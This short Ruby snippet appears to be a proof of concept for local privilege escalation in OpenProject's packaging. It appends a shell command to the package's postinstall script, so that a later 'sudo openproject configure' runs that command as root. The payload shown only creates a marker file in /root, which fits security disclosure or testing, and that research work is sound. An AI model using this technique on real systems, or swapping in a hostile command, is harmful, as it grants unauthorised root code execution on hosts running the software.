# This will make sudo openproject configure create /root/root-rce.txt.
path = "/opt/openproject/packaging/scripts/postinstall"

File.open(path, "a") do |f|
  f.puts "touch /root/root-rce.txt"
end
